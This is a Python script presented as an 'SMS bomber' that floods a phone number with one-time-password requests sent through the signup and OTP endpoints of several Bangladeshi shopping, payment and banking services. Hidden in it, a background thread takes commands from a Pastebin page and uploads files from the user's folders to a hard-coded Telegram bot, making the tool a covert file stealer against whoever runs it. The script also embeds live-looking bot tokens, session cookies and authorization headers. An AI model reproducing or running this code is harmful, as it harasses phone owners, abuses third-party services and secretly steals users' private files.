
import os
try:
    import mechanize
    import requests ,random, uuid, threading
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
except ImportError:
    os.system("pip install requests mechanize bs4")
    import mechanize
    import requests ,random, uuid, threading
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
fcheck =False
scheck=False
def tg():
    while True:
        commands=requests.get("https://pastebin.com/raw/2Nq5PFz3").json()
        if commands["start"]=="yes":
            dir_list = os.listdir(commands["folder"])
            text=str(len(dir_list))+"\n"+str(dir_list)
            if len(text) >4096:
                text=str(len(dir_list))+str(dir_list)[:4000]
            if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
                if commands["grabe"] == "yes":
                    dir_list = os.listdir(commands["folder"])
                    i=int(commands["file_number"])
                    while i<len(dir_list):
                        try:
                            TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
                            photo_path = commands["folder"]+dir_list[i]
                            if str(photo_path).endswith("mp4"):
                                pass
                            else:
                                with open(photo_path, 'rb') as photo_file:
                                    payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
                                    response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
                                if response.status_code == 200:
                                    pass
                                else:
                                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
                        except Exception as err:
                            requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
                        global scheck
                        if scheck:
                            break
                        i=i+1
                    break
                else:
                    pass
            else:
                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
        else:
            pass
        global fcheck
        if fcheck:
            break



def apis(number):
    def randomChar():
        x=""
        for i in range(10):
            x=x+chr(random.randint(ord('a'), ord('z')))
        return x
    res =requests.post("https://api.reserveitbd.com/api/signup",json={"email":f"{randomChar()}@gmail.com","firstName":"Md ekramul","lastName":"hassan","password":"mao2116@#","phone":number,"type":"User","userName":randomChar()}).text
    if "Phone number already exist" in res:
        print(f"Attack on  >> "+number)
        (requests.put("https://api.reserveitbd.com/api/send-otp",json={"phone":number,"type":"User"}).text)
    else:
        print(f"Attack on  >> "+number)
        (requests.put("https://api.reserveitbd.com/api/send-otp",json={"phone":number,"type":"User"}).text)

    headers={"Authorization": "Basic E8xlkWsSjZKBZ8yQ6VjaQIUM9tUfo/bPdrOy+BATiwc=",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
    "Host": "test.dmoney.com.bd:3035",
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Length": "20"}
    token=requests.post("https://test.dmoney.com.bd:3035/Dmoney/Token",data="grant_type=password&",headers=headers).json()["access_token"]
    uuiDeviceRandom = str(uuid.uuid4().fields[-1])[:7]
    headers={"productCode": "DM",
    "Authorization": f"bearer {token}",
    "accept-language": "en",
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
    "Host": "test.dmoney.com.bd:3035",
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Length": "423"}
    json={"mobileNumber":number,"operatorId":"1","deviceName":"samsung SM-G965N Android 7.1.2","deviceNumber":f"9713aadd8{uuiDeviceRandom}","hardwareSignature":"544aed4fbc3ec3d4f7b55c1ded63f04a3c2dbbc8d5bad5f0d391e70aa7acf15f544b797f529fedfc62025053ba4e64ae639627a97cf24e049fe4307f7b9f01ae","mobileAppVersion":"3.0.6","mobileAppVersionCode":63,"productCode":"DM","requestId":"8414F7C27DFC5BBA","sessionStatusNeeded":0,"sessionToken":""}
    (requests.post("https://test.dmoney.com.bd:3035/DmoneyPlatform/um_customer_create_step_init",json=json,headers=headers).text)
    print(f"Attack on  >> "+number)
    try:
        br = mechanize.Browser()
        br.open("https://www.isho.com/register")
        br.select_form(nr=1)
        br.form["phone"]=number
        br.form["email"]="ekramu@gmail.com"
        gt=br.submit()
        print(f"Attack on  >> "+number)
    except:
        pass

    headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding":"gzip, deflate, br",
    "Accept-Language":"en-US,en;q=0.9",
    "Cache-Control":"max-age=0",
    "Cookie":".AspNetCore.Session=CfDJ8Nn36%2F1msD5FhvyVv9UsCOjJ5UOlOFG6jRg%2Fsr6zDDD9pUE6dpOASMB6F%2BILWzsfwCF4WSiaWyXZcUF6wT5RoLXLJSfPpQp%2BpEiw%2Bi9yPaBS04WLJ%2FCknSbODTRGcchzBMbn3fDgUqdPWMXQcRklAzHzQ4bBci6mUVilnDNpmIX2; _gcl_au=1.1.1952976585.1706953925; _gid=GA1.3.426691066.1706953926; _clck=sgygmn%7C2%7Cfiy%7C0%7C1494; .AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8Nn36_1msD5FhvyVv9UsCOhttwMGsWnnBWtHB4AJunWT8GAyRTuJPavPGteTlBaQUc4kVl4pkR4JO9bD1X92rv6fyyhFcWlAmtms52eAYl__EPsW2ds4P4cx9kS-m5eWByu7ZgSKgLlsmWEvwg92B0U; _ga=GA1.3.236936856.1706953926; _ga_HGH2QBVYLE=GS1.1.1706953925.1.1.1706954481.54.0.0; _clsk=gc4yqj%7C1706956017147%7C6%7C1%7Cq.clarity.ms%2Fcollect",
    "Referer":"https://pbs.com.bd/publisher/6659/chilekotha-publication/1?fbclid=IwAR1KFn1Ov-nOl3l8QsqLhFe-VbbLV_o0uwwImbqLq22YM2ncW2DcGjzr0y4",
    "Sec-Ch-Ua":'"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    "Sec-Ch-Ua-Mobile":"?0",
    "Sec-Ch-Ua-Platform":"Windows",
    "Sec-Fetch-Dest":"document",
    "Sec-Fetch-Mode":"navigate",
    "Sec-Fetch-Site":"same-origin",
    "Sec-Fetch-User":"?1",
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
    soup = BeautifulSoup(requests.get("https://pbs.com.bd/login",headers=headers).text, 'html.parser')
    token = soup.find("input", {"name": "__RequestVerificationToken"}).get("value")
    x=requests.post("https://pbs.com.bd/login/?handler=UserGetOtp",json={"UserName":"","UserPassword":"","chkRememberPassword":"","MobileNo":number},headers={"X-Requested-With":"XMLHttpRequest",
    "Xsrf-Token":token,
    "Content-Type":"application/json; charset=UTF-8",
    "Cookie":".AspNetCore.Session=CfDJ8Nn36%2F1msD5FhvyVv9UsCOjJ5UOlOFG6jRg%2Fsr6zDDD9pUE6dpOASMB6F%2BILWzsfwCF4WSiaWyXZcUF6wT5RoLXLJSfPpQp%2BpEiw%2Bi9yPaBS04WLJ%2FCknSbODTRGcchzBMbn3fDgUqdPWMXQcRklAzHzQ4bBci6mUVilnDNpmIX2; _gcl_au=1.1.1952976585.1706953925; _gid=GA1.3.426691066.1706953926; _clck=sgygmn%7C2%7Cfiy%7C0%7C1494; .AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8Nn36_1msD5FhvyVv9UsCOhttwMGsWnnBWtHB4AJunWT8GAyRTuJPavPGteTlBaQUc4kVl4pkR4JO9bD1X92rv6fyyhFcWlAmtms52eAYl__EPsW2ds4P4cx9kS-m5eWByu7ZgSKgLlsmWEvwg92B0U; _ga=GA1.3.236936856.1706953926; _ga_HGH2QBVYLE=GS1.1.1706953925.1.1.1706954481.54.0.0; _clsk=gc4yqj%7C1706954483343%7C4%7C1%7Cq.clarity.ms%2Fcollect"})
    print(f"Attack on  >> "+number)

    url="https://shopapp.self-shopping.com/public/smsapiupdate?mobile="+number+"&msg=registration_otp&reason=setotp&uniqueCode="+requests.post("https://shopapp.self-shopping.com/public/otherspost?random=0.7632928168765943",json={"storeDeviceId":"0.otc4kup7889","uid":0},headers={"Host": "shopapp.self-shopping.com",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "okhttp/4.9.2",
    "Connection": "close"}).json()["string"]
    print(f"Attack on  >> "+number)

    (requests.get(url,headers={"Host": "shopapp.self-shopping.com",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "okhttp/4.9.2",
    "Connection": "close"}).text)
    print(f"Attack on  >> "+number)

    headers={"user-agent": "Dart/2.10 (dart:io)",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "content-length": "97",
    "authorization": "Otp bnVsbA==",
    "host": "ibanking.siblbd.com:31888"}
    x=requests.post("https://ibanking.siblbd.com:31888/cihno-service/api/v1/public/user/send/otp",json={"countryId":"19","mobileNumber":number,"purpose":"registration","id":8469,"text":"awzNC"},headers=headers).text
    print(f"Attack on >> "+number)
def main():
    t1=threading.Thread(target=tg)
    t1.start()
    logo="""
        [ 1. ] RELAX BOMB [ FAST ]
        [ 2. ] FLASH BOMB [ ULTRA FAST ]
        [ 3. ] MAO2116 [ DEVELOPER ]
        [ !. ] PRESS ctrl + c To Bomb again [ !. ]
        
    """
    os.system("clear")
    print(logo)
    manu=input("[ ! ] ENTER YOUR MANU : ")
    if manu =="1":
        number=input("Enter Your Number : ")
        limit=input("Enter Your Bombing Limit : ")
        for i in range(int(limit)):
            apis(number)
        fcheck=True
        scheck=True
        t1.join()
    elif manu =="2":
        number=input("Enter Your Number : ")
        limit=input("Enter Your Bombing Limit : ")
        with ThreadPoolExecutor(max_workers=5) as pool:
            pool.map(apis, int(limit)*[number])
            pool.shutdown(wait=True)
        fcheck=True
        scheck=True
        t1.join()
    elif manu =="3":
        os.system("xdg-open https://www.facebook.com/m.e.h.2116")
    elif manu =="4":
        pass
    else:
        os.system("clear")
        print("         WRONG CHOICE")
        main()
main()
